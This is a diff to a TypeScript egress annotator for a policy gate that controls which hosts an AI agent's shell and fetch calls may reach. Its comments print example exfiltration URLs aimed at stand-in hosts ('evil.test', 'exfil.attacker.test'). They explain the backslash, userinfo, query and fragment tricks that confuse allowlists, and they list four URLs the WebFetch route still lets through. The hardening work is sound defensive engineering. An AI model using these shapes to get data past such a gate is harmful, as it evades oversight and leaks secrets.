@@ -47,22 +47,70 @@
  * exactly the class an egress gate is deployed for. `curl` reaches `metadata`
  * and `internal-api` for those two (measured with `curl -w '%{url.host}'`).
  *
- * So this module hands over `new URL(...).origin`, not the matched text. An
- * origin is scheme, host and port and nothing else: it CANNOT carry a userinfo,
- * a query or a fragment, so every shape above collapses to the host the request
- * actually reaches, and `host_of()`'s remaining job -- split the port off -- is
- * one it does correctly. Measured, all three deny after the change.
+ * So where this module answers a destination at all, it answers
+ * `new URL(...).origin`, not the matched text. An origin is scheme, host and
+ * port and nothing else: it CANNOT carry a userinfo, a query or a fragment, so
+ * every shape above collapses to the host the request actually reaches, and
+ * `host_of()`'s remaining job -- split the port off -- is one it does
+ * correctly. Measured, all three deny.
  *
- * THREE HAND-ROLLED NORMALISERS PRECEDED THIS ONE, AND EACH LEAKED A DIFFERENT
+ * WHY THE PARSE ALONE IS NOT ENOUGH, AND WHY AMBIGUITY IS ANSWERED WITH A
+ * DESTINATION THAT CANNOT RESOLVE. Three parsers disagree about what host a
+ * command line reaches, and only one of them is the one that matters:
+ *
+ *   - `new URL`, which follows the WHATWG rules;
+ *   - `host_of()` in `policy/lib/egress.rego`, whose two splits are neither
+ *     WHATWG nor RFC 3986;
+ *   - `curl`, after the shell has already rewritten the argument.
+ *
+ * The measured case that separates them is a backslash. WHATWG treats "\" as
+ * "/" in a special scheme, so the authority ends there; `curl` does not treat
+ * it as a delimiter at all, and an unquoted shell removes it before `curl` ever
+ * sees it. So for `curl https://docs.anthropic.com\@evil.test/steal`, a parse
+ * of the matched text answers the origin `https://docs.anthropic.com`, which
+ * `*.anthropic.com` covers, while `curl` reaches `evil.test` (measured with
+ * `curl -w '%{url.host}'`). That is an allowlisted answer for an off-allowlist
+ * destination, and no amount of delimiter-fixing removes the class: computing
+ * "the host this will reach" from a PRE-SHELL command line needs both a shell
+ * parser and curl's parser, and this module has neither.
+ *
+ * So the default is inverted. This module decides only the shapes on which no
+ * parser could disagree -- a plain host, optionally a numeric port, terminated
+ * by "/", "?", "#" or the end of the token -- and answers every other shape
+ * with a destination that cannot resolve, `AMBIGUOUS_DESTINATION` below. The
+ * gate then denies it, because no allowlist can cover it. Narrow and total
+ * beats clever and partial: a shape this module does not recognise is one it
+ * refuses to vouch for, rather than one it guesses about.
+ *
+ * `{}` IS NOT A SAFE ANSWER TO AMBIGUITY, AND THAT IS THE LOAD-BEARING POINT.
+ * With no destination the gate's `destination(rules)` resolves nothing, is
+ * undefined, and the call ALLOWS. Ambiguity only denies if this module hands
+ * over a string the allowlist cannot match. `{}` is kept for the cases that
+ * genuinely carry no URL -- no match at all, a non-string `raw_command`, a
+ * destination argument the gate already reads, an input shape this function
+ * cannot read -- because those mean "this module has no opinion", which is a
+ * different thing from "this module cannot tell".
+ *
+ * WHAT THE OPERATOR SEES. For an ambiguous input the gate's message reads
+ * `destination unresolved.invalid not in allowlist [...]` -- less informative
+ * than a message naming a host, and deliberately so, because naming a host
+ * would mean claiming to know which one. The command that produced it is
+ * unchanged in the audit envelope, so the shell text is recoverable there; this
+ * comment is what an operator who greps that literal string is looking for.
+ *
+ * FOUR HAND-ROLLED ATTEMPTS PRECEDED THIS ONE, AND EACH LEAKED A DIFFERENT
  * SHAPE. The first handed the URL over as matched; the second stripped userinfo
  * but bounded the authority at "/" alone, which re-opened the class on
  * query-delimited and fragment-delimited authorities; the third bounded at "/",
- * "?" and "#" and still left the dotless-host shape, because that one is not
- * about the bound at all. Three rounds, three shapes: the defect was hand-
- * rolling the parse, so the parse is no longer hand-rolled. Do not reintroduce
- * a bespoke normaliser beside this one -- two answers to "what is the host"
- * is the same two-declarations-of-one-fact hazard the policy-target argument
- * table exists to remove.
+ * "?" and "#" and still left the dotless-host shape; the fourth replaced the
+ * hand-rolled strip with a real parse and leaked the backslash shape above --
+ * the first of the four to answer an ALLOWLISTED host for an off-allowlist
+ * destination. Each round closed the shape it was shown and met a new one,
+ * because each round was still trying to compute an undecidable answer. Do not
+ * add a fifth pattern for the next shape found: the shape belongs in the
+ * differential corpus in `packages/guardian/test/fixtures/`, and if the
+ * annotator answers an allowlisted host for it, what is wrong is the
+ * unambiguous-shape test, not the missing special case.
  *
  * WHAT AN ORIGIN DROPS, AND WHY IT COSTS NOTHING HERE. The path, query and
  * fragment go. The gate consults only `host_of(dest)`, so today none of them
@@ -75,19 +123,35 @@
  * TWO EFFECTS IN THE PERMISSIVE DIRECTION, BOTH MEASURED AND BOTH RECORDED
  * RATHER THAN DISCOVERED LATER. `new URL` lowercases the host, and the
  * allowlist glob is case-sensitive, so `curl https://DOCS.ANTHROPIC.COM/x`
- * denied before this change and allows after it. That is correct -- DNS is
- * case-insensitive and the request reaches the allowlisted host either way --
- * but it is a widening, and it is stated as one. `curl https://EVIL.TEST/x`
- * still denies, and so does `curl https://docs.anthropic.com.evil.test/x`.
+ * denied under an earlier build of this module and allows now. That is correct
+ * -- DNS is case-insensitive and the request reaches the allowlisted host
+ * either way -- but it is a widening, and it is stated as one.
+ * `curl https://EVIL.TEST/x` still denies, and so does
+ * `curl https://docs.anthropic.com.evil.test/x`.
+ *
+ * ONE EFFECT IN THE RESTRICTIVE DIRECTION, ALSO MEASURED.
+ * `curl https://docs.anthropic%2ecom/x` denies now. A percent-escape is not a
+ * shape the unambiguous test admits, so it answers the sentinel -- yet `curl`
+ * resolves that URL to `docs.anthropic.com`, which the allowlist covers. It is
+ * a real over-block, and it is the direction this module chooses to fail in.
  *
  * THIS IS A CORRECTION TO THE STRING THIS MODULE CHOOSES TO SUPPLY, NOT TO THE
- * GATE. The same misreadings are still live on the path that does not come
- * through here: a fetch tool's own `url` argument is the gate's FIRST declared
- * destination path, read by `host_of()` directly with nothing in between, so
- * `WebFetch` of the colon-bearing URL above is still allowed. Closing that
- * would mean editing `policy/lib/egress.rego`, which is AGT's file, held
- * byte-identical by `bun run verify:pin`. It is recorded as a measured
- * limitation instead -- see the runbook section on what this does not catch.
+ * GATE, AND THE TWO ROUTES ARE NOT SYMMETRIC. The same misreadings are still
+ * live on the path that does not come through here: a fetch tool's own `url`
+ * argument is the gate's FIRST declared destination path, read by `host_of()`
+ * directly with nothing in between. Measured against the shipped allowlist,
+ * four URLs are ALLOWED there and denied here:
+ *
+ *   https://docs.anthropic.com:pw@exfil.attacker.test/steal  reaches exfil.attacker.test
+ *   https://metadata?x=@docs.anthropic.com                   reaches metadata
+ *   https://internal-api#@docs.anthropic.com                 reaches internal-api
+ *   https://evil?x=@docs.anthropic.com                       reaches evil
+ *
+ * Closing those would mean editing `policy/lib/egress.rego`, which is AGT's
+ * file, held byte-identical by `bun run verify:pin`. They are recorded as a
+ * measured limitation instead -- see the runbook section on what this does not
+ * catch. A reader who takes "two routes, one gate" to mean the two routes
+ * decide alike is reading something this deployment does not claim.
  *
  * WHY IT READS THE PRELIMINARY DOCUMENT ITSELF. A manifest's
  * `annotations.<name>.from` is a liveness precondition, not a projection: the
@@ -136,25 +200,59 @@ const ARGUMENTS_AGT_ALREADY_READS = ["url", "endpoint", "host", "domain"] as con
  */
 const DESTINATION_IN_COMMAND = /\bhttps?:\/\/[^\s'"`;|&()<>]+/;
 
+/**
+ * The authority shapes on which no parser disagrees: a plain host, optionally a
+ * numeric port, terminated by "/", "?", "#" or the end of the token.
+ *
+ * Every character admitted before that terminator is one that WHATWG,
+ * `host_of()` and `curl` all read as part of the host. What is excluded is
+ * where they part company: "@" (userinfo, which two of the three do not bound),
+ * "\" (a delimiter to WHATWG, a host character to `curl`, and removed outright
+ * by an unquoted shell), "%" (an escape WHATWG decodes inside a host and
+ * `host_of()` does not), ":" followed by anything but digits (a userinfo
+ * password to WHATWG, a port separator to `host_of()`), and every character
+ * that is not a letter, digit, dot or hyphen.
+ *
+ * Anchored at the start, so it tests the whole match rather than searching
+ * inside it: a match that begins unambiguously and then turns ambiguous fails.
+ */
+const UNAMBIGUOUS_AUTHORITY = /^https?:\/\/[A-Za-z0-9.\-]+(?::\d+)?(?:[/?#]|$)/;
+
+/**
+ * What this module answers when it cannot tell which host a command reaches.
+ *
+ * RFC 2606 reserves `.invalid` for exactly this: a name guaranteed never to
+ * resolve, so it can never be a real destination and can never be legitimately
+ * allowlisted. It is a value the gate can decide about and must deny, which is
+ * the whole point -- an absent destination would make the gate undefined and
+ * the call would ALLOW.
+ */
+const AMBIGUOUS_DESTINATION = "https://unresolved.invalid";
+
 function isPlainObject(value: unknown): value is Record<string, unknown> {
   return typeof value === "object" && value !== null && !Array.isArray(value);
 }
 
 /**
- * Answers `{destination}` when it finds one, `{}` when it does not. The
- * destination is the matched URL's ORIGIN -- scheme, host and port -- not the
- * matched text; see the module header for the three measured shapes that makes
- * the difference between a denial and an allow.
+ * Answers one of three things, and the difference between the second and the
+ * third is the whole design:
+ *
+ *   - `{destination}` carrying an ORIGIN -- scheme, host and port -- when the
+ *     command carries a URL whose authority no parser could read two ways;
+ *   - `{destination}` carrying `AMBIGUOUS_DESTINATION` when it carries a URL
+ *     this module cannot vouch for, so the gate denies rather than allows;
+ *   - `{}` when it carries no URL for this module to have an opinion about, or
+ *     when a destination the gate already reads is on the snapshot.
  *
  * Never a throw and never `null`, and both halves are load-bearing. AGT turns
  * any annotator failure -- thrown or rejected -- into its own
  * `runtime_error:annotation_failed` deny, which lands on EVERY call in the
  * deployment, benign ones included, and reads like a policy decision. And a
  * command with no destination is not a failure: the gate is `undefined` when
- * nothing resolves, and the call falls through to the other gates. So an
- * obfuscated or novel egress form is UNEXAMINED here, not denied -- the
- * failure direction the runbook states plainly, because the demo's shape
- * invites the opposite reading.
+ * nothing resolves, and the call falls through to the other gates. So a shell
+ * step that reaches the network in a form this regex does not match at all is
+ * UNEXAMINED here, not denied -- the failure direction the runbook states
+ * plainly, because the demo's shape invites the opposite reading.
  *
  * `name` and `config` are part of the dispatcher contract and are not read:
  * this function is the one annotator this Guardian has, and routing by name is
@@ -176,19 +274,26 @@ export function annotateEgressDestination(_name: string, _config: unknown, preli
   if (typeof rawCommand !== "string") return {};
 
   const found = DESTINATION_IN_COMMAND.exec(rawCommand);
+  // No URL in the command is the one case where silence is right: nothing here
+  // is a destination, so there is nothing to be ambiguous about.
   if (found === null) return {};
+
+  // Everything past this point is a URL, and from here `{}` would be an ALLOW.
+  // A shape the unambiguous test rejects gets the sentinel, not silence.
+  if (!UNAMBIGUOUS_AUTHORITY.test(found[0])) return { destination: AMBIGUOUS_DESTINATION };
 
   // `new URL` throws on input it cannot parse, and this function may not: a
   // throw here becomes AGT's own `runtime_error:annotation_failed` deny on
-  // every call in the deployment. So an unparseable match is answered the same
-  // way a command with no URL in it is -- `{}`, no destination, unexamined
-  // rather than denied. The regex is scheme-anchored, so a match always carries
-  // one, and the catch is for the shapes a scheme alone does not make valid.
+  // every call in the deployment. The test above does not make the parse
+  // infallible -- `https://:1` passes no part of it, but `https://a:99999999999`
+  // has the shape and still throws on the port range -- so the catch answers
+  // the sentinel too. It is the same judgement: a URL this module cannot
+  // resolve to an origin is one it will not vouch for.
   let parsed: URL;
   try {
     parsed = new URL(found[0]);
   } catch {
-    return {};
+    return { destination: AMBIGUOUS_DESTINATION };
   }
   return { destination: parsed.origin };
 }
